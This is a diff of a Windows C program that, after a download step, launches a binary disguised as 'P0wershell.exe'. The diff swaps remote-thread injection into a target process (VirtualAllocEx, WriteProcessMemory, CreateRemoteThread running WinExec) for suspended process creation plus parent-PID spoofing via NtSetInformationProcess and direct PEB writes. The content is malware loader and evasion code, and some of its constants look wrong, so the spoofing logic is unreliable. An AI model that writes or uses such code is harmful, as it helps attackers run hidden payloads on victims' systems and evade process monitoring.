@@ -5,6 +5,14 @@
 
 BOOL WINAPI IsUserAnAdmin(void);
 
+typedef struct _PROCESS_BASIC_INFORMATION {
+    PVOID Reserved1;
+    PVOID PebBaseAddress;
+    PVOID Reserved2[2];
+    ULONG_PTR UniqueProcessId;
+    ULONG_PTR InheritedFromUniqueProcessId;
+} PROCESS_BASIC_INFORMATION;
+
 int main(void) {
     if (!IsUserAnAdmin())
         return 1;
@@ -61,47 +69,66 @@ int main(void) {
     }
     printf("[+] Download complete.\n");
 
-    // open target process for injection
-    HANDLE hTarget = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION, FALSE, targetPID);
+    // open target for handle duplication
+    HANDLE hTarget = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, targetPID);
     if (!hTarget) {
         printf("[-] Failed to open target process (%lu)\n", GetLastError());
         return 1;
     }
-    printf("[+] Opened target process handle\n");
 
-    // allocate memory in target for command line
-    SIZE_T cmdLen = lstrlenA(outPath) + 1;
-    LPVOID remoteMem = VirtualAllocEx(hTarget, NULL, cmdLen, MEM_COMMIT, PAGE_READWRITE);
-    if (!remoteMem) {
-        printf("[-] VirtualAllocEx failed (%lu)\n", GetLastError());
+    // resolve NtQueryInformationProcess from ntdll
+    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+    NTSTATUS (NTAPI *pNtQueryInformationProcess)(HANDLE, DWORD, PVOID, ULONG, PULONG) =
+        (NTSTATUS (NTAPI *)(HANDLE, DWORD, PVOID, ULONG, PULONG))GetProcAddress(hNtdll, "NtQueryInformationProcess");
+
+    // resolve NtSetInformationProcess from ntdll
+    NTSTATUS (NTAPI *pNtSetInformationProcess)(HANDLE, DWORD, PVOID, ULONG) =
+        (NTSTATUS (NTAPI *)(HANDLE, DWORD, PVOID, ULONG))GetProcAddress(hNtdll, "NtSetInformationProcess");
+
+    if (!pNtQueryInformationProcess || !pNtSetInformationProcess) {
+        printf("[-] Failed to resolve NT APIs\n");
         CloseHandle(hTarget);
         return 1;
     }
 
-    if (!WriteProcessMemory(hTarget, remoteMem, outPath, cmdLen, NULL)) {
-        printf("[-] WriteProcessMemory failed (%lu)\n", GetLastError());
-        VirtualFreeEx(hTarget, remoteMem, 0, MEM_RELEASE);
+    // create P0wershell.exe suspended
+    STARTUPINFOA si = { .cb = sizeof(STARTUPINFOA) };
+    PROCESS_INFORMATION pi;
+    if (!CreateProcessA(NULL, (LPSTR)outPath, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
+        printf("[-] CreateProcess failed (%lu)\n", GetLastError());
         CloseHandle(hTarget);
         return 1;
     }
-    printf("[+] Written command line to target\n");
+    printf("[+] Created P0wershell.exe suspended (PID: %lu)\n", pi.dwProcessId);
 
-    // inject thread to call WinExec(path) inside target process
-    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
-    LPTHREAD_START_ROUTINE pWinExec = (LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "WinExec");
-
-    HANDLE hThread = CreateRemoteThread(hTarget, NULL, 0, pWinExec, remoteMem, 0, NULL);
-    if (!hThread) {
-        printf("[-] CreateRemoteThread failed (%lu)\n", GetLastError());
-        VirtualFreeEx(hTarget, remoteMem, 0, MEM_RELEASE);
-        CloseHandle(hTarget);
-        return 1;
+    // attempt PPID spoofing via NtSetInformationProcess
+    DWORD parentPID = targetPID;
+    NTSTATUS status = pNtSetInformationProcess(pi.hProcess, 0x1D, &parentPID, sizeof(DWORD));
+    if (status >= 0) {
+        printf("[+] PPID spoofed via NtSetInformationProcess\n");
+    } else {
+        // fallback: modify PEB directly
+        PROCESS_BASIC_INFORMATION pbi;
+        ULONG retLen;
+        status = pNtQueryInformationProcess(pi.hProcess, 0, &pbi, sizeof(pbi), &retLen);
+        if (status >= 0) {
+            ULONG_PTR newParent = (ULONG_PTR)targetPID;
+            if (WriteProcessMemory(pi.hProcess, (PBYTE)pbi.PebBaseAddress + 0x098, &newParent, sizeof(ULONG_PTR), NULL)) {
+                printf("[+] PPID spoofed via PEB modification\n");
+            } else {
+                printf("[-] PEB modification failed (%lu)\n", GetLastError());
+            }
+        } else {
+            printf("[-] NtQueryInformationProcess failed\n");
+        }
     }
-    printf("[+] Remote thread executing P0wershell.exe via target process\n");
 
-    WaitForSingleObject(hThread, INFINITE);
-    CloseHandle(hThread);
-    VirtualFreeEx(hTarget, remoteMem, 0, MEM_RELEASE);
+    // resume the process
+    ResumeThread(pi.hThread);
+    printf("[+] P0wershell.exe resumed\n");
+
+    CloseHandle(pi.hProcess);
+    CloseHandle(pi.hThread);
     CloseHandle(hTarget);
 
     Sleep(2000);
